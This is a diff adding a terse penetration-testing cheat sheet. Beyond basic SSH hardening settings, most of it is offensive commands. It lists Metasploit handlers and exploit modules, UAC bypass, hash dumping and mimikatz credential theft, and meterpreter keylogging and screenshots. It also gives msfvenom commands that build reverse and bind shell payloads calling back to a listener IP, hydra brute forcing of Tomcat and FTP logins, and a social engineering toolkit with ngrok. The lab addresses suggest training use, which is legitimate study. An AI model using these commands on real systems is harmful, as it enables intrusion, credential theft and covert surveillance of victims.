@@ -1,0 +1,150 @@
+Start Apache Server	
+service apache2 start
+
+Start SSH Server	
+# systemctl start ssh.socket
+	# systemctl stop ssh.socket
+	# systemctl enable ssh.service
+	# systemctl start ssh.service
+	# systemctl status ssh.service
+	# systemctl stop ssh.service
+	# systemctl disable ssh.service
+	systemctl enable ssh.service
+	systemctl start ssh.service
+	systemctl start ssh.socket
+
+*********************************** 
+ SSH Settings	
+ /etc/ssh/sshd_config
+"systemctl reload ssh
+or 
+systemctl reload sshd"
+
+PremitRootLogin no
+PremitRootLogin without-password //to only allow root login with a key
+PasswordAuthentication no //to disable password authentication
+AllowUsers user1 user2 userN //allow ssh only for selected users
+AllowGroups group1 group2 groupN
+DenyUsers
+DenyGroups
+AllowTcpForwarding No //disallow tcp connections
+GatewayPorts No
+ListenAddress host_or_address1 //listen to a specific address"
+
+Generate SSH-Key	
+ssh-keygen
+ssh-copy-id [user@]Host
+
+Port Forwarding on SSH	
+ssh -L 3306:127.0.0.1:3306 server1 //to listen to application by connecting via ssh
+ssh -D 8080 server1 //dynamic port forwarding via ssh
+ssh -R 2222:127.0.0.1:22
+
+********************************************************************
+Start Metasploit Framework
+
+service postgresql start	//Kali 1.0
+msfdb init	
+msfconsole	
+/etc/init.d/postgresql start	//Kali 2.0
+	
+sessions -i	//view active sessions in metasploit
+sessions -i 1	//get the shell of the 1st session
+	
+use exploit/multi/handler	
+set payload windows/x64/meterpreter/reverse_tcp	
+	
+use multi/http/tomcat_mgr_upload	
+php exploit: php_cgi_arg_injection	
+route add 112.112.112.1 255.255.255.0 <meterpretersessionID>	
+set RHOST to targetIP	
+	
+use exploit/windows/local/bypassuac	    //to escalate windows privilege from user to system
+run post/windows/gather/smart_hashdump	//metasploit post exploitation script to dump hashes
+	
+meterpreter> load mimikatz	load mimikatz extension for meterpreter
+?	//help
+	
+wdigest	get wdigest credentials
+execute -f cmd.exe -H -c -i	to open command promt from a meterpreter shell
+	
+order is session->station->Desktop	//WinObj v2.22, part of sys internals. details of session, station and desktop
+sniffer//	monitor remote interface traffic from meterpreter
+use sniffer	//to load sniffer extension from meterpreter
+?	view sniffer commands
+
+use sniffer	to load sniffer extension from meterpreter
+?	view sniffer commands
+	
+getdesktop	to get desktop from meterpreter session. necessary to perfrom all below activities
+enumdesktops	enmerate all desktops from meterpreter
+	
+use stapi	to perfrom activities such as keystroke monitoring, and desktop related things
+keyscan_start	
+uictl	to enable/disable keyboard/mouse
+screenshot	
+
+********************************************************************
+webshells in kali			
+cd /usr/share/webshells			
+			
+msfvenom	//To create payloads for file uploads		
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<<own IP address>> lport=<<self port>> -f war R > asdf.war
+			
+msfvenom -p windows/meterpreter/bind_tcp -o			//to list all options
+msfvenom -p windows/meterpreter/bind_tcp -a x86 -f exe > bind_shell.exe			//to create windows shell payload
+			
+msfvenon -p windows/meterpreter/reverse_tcp -a x86 -f exe LHOST=192.168.1.13 > Reverse_connect			//to create reverse tcp payload
+msfvenon -p windows/meterpreter/reverse_https -a x86 -f exe LHOST=192.168.1.13 > Reverse_https			//https based reverse shell
+msfvenom -p windows/meterpreter/reverse_tcp_allports LHOST=192.168.1.13 LPORT=4444 -a x86 -f exe > reverse_all.exe			//open whole range of ports
+
+********************************************************************
+
+Discovery Tools	Sub Bruting
+sublist3r	subbrute
+MassDNS	gobuster
+recon-ng	massDNS
+Alt DNS wrapper	dns-parallel-prober
+sub scrapping tool	blacksheepwall
+massscan (can be used in place of nmap to do port scanning, but for quicker results)	
+	
+tplmap	tool to test for server side template injection (SSTI)
+
+********************************************************************
+
+Start Armitage	
+armitage
+	
+Skipfish	
+skipfish -o /root/test -S /usr/share/skipfish/dictionaries/complete.wl http://...
+	
+hydra	
+hydra -L /root/Desktop/Wordlists/Usernames.txt -P /root/Desktop/Wordlists/Passwords.txt ftp://[IP Address of Windows 10]
+hydra -C /usr/share/seclists/passwords/default-credentials/tomcat-betterdefaultpasslist.txt -s 8080 10.10.10.95 http-get /manager/html
+	
+uniscan	
+uniscan -u http://10.10.10.12:8080/CEH -q
+uniscan -u http://10.10.10.12:8080/CEH -we
+uniscan -u http://10.10.10.12:8080/CEH -d
+
+steghide	tool to extract data from an  image (steganography)
+	
+iptables -A PREROUTING -t nat -i eth0 -p tcp --dport 4444:6010 -j DNAT --to-destination 192.16.1.13:4444
+
+SET (social Engineering Toolkit)	
+sudo apt-get install apache2	
+launch social engineering toolkit	
+python cuteit.py	//Download cuteit
+./ngrok http 80	//port forwarding and use http url from localhost
+		
+		
+Shodan Database	
+easy_install shodan	
+		
+Docker	
+service docker start	
+docker images	
+
+john the  ripper (to  crack the password)	
+john <<filename>>
+john <<filename>> --show
